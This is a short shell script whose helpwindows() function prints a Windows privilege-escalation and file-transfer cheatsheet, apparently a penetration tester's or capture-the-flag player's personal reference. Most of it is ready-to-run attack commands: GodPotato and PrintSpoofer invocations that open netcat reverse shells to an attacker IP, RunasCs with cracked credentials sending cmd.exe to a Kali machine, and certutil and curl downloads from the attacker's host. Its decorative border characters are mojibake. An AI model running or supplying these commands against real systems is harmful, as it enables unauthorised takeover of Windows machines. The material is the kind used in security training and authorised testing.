# Color definitions (if not already added)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

helpwindows() {
  echo -e "${BOLD}${RED}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
  echo -e "${BOLD}${RED}   WINDOWS PRIVILEGE ESCALATION CHEATSHEET${NC}"
  echo -e "${BOLD}${RED}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
  echo ""
  echo -e "${RED}Run: whoami${NC}"
  echo -e "${RED}Run: whoami /priv${NC}"
  echo -e "${RED}Run: whoami /groups${NC}"
  echo -e "${RED}Run: net user <target_user>${NC}"
  echo -e "${RED}Run: net localgroup administrators${NC}"
  echo -e "${RED}Run: net localgroup "Remote Desktop Users"${NC}"
  echo -e "${RED}Run: shutdown /r /t 0 (reboot for service restart)${NC}"
  echo -e "${RED}Run: schtasks /query /fo LIST /v${NC}"
  echo -e "${RED}Run: systeminfo${NC}"
  echo ""
  echo -e "${PURPLE}Check: SeImpersonatePrivilege Enabled${NC}"
  echo -e "${PURPLE}CHeck: SeAssignPrimaryTokenPrivilege Enabled${NC}"
  echo -e "${PURPLE}CHeck: SeDebugPrivilege Enabled${NC}"
  echo -e "${PURPLE}CHeck: SeBackupPrivilege Enabled${NC}"
  echo -e "${PURPLE}CHeck: SeRestorePrivilege Enabled${NC}"
  echo -e "${PURPLE}CHeck: SeTakeOwnershipPrivilege Enabled${NC}"
  echo ""
  echo -e "${CYAN}Run: .\\winPEAS.exe > winpeas.txt${NC}"
  echo -e "${CYAN}Run: Seatbelt.exe -group=all${NC}"
  echo -e "${CYAN}Run: GodPotato -cmd "nc -t -e C:\\\\Windows\\\\System32\\\\cmd.exe IP\""${NC}"
  echo -e "${CYAN}Run: GodPotato-NET4.exe -cmd \"nc64.exe -v -v -n -e C:\\\\Windows\\\\System32\\\\cmd.exe <IP> <PORT>\"${NC}"
  echo -e "${CYAN}Run: PrintSpoofer.exe -i -c cmd${NC}"
  echo -e "${CYAN}Run: PrintSpoofer.exe -c \"C:\\\\Path\\\\To\\\\nc.exe <Attacker_IP> <Port> -e cmd.exe\"${NC}"
  echo ""
  echo -e "${PURPLE} ------Abuse cracked credentials ------${NC}"
  echo -e "${CYAN}Run: .\\\\RunasCs.exe <username> '<password>' cmd.exe -r <kali_machine>:<PORT>${NC}"
  echo -e "${CYAN}Run: runas /user:<username> cmd${NC}"
  echo ""
  echo -e "${BOLD}${PURPLE}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
  echo -e "${BOLD}${PURPLE}   WINDOWS FILE TRANSFER CHEATSHEET${NC}"
  echo -e "${BOLD}${RED}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
  echo -e "${BOLD}${BLUE}Run: certutil -urlcache -split -f http://<My Machine>:<PORT>/azure.ps1 -o azure.ps1${NC}"
  echo -e "${BOLD}${BLUE}Run: certutil -urlcache -split -f http://<My Machine>:<PORT>/ignite.txt ignite.txt${NC}"
  echo -e "${BOLD}${BLUE}Run: curl http://<My Machine>:<PORT>/ignite.txt -o ignite.txt${NC}"

}

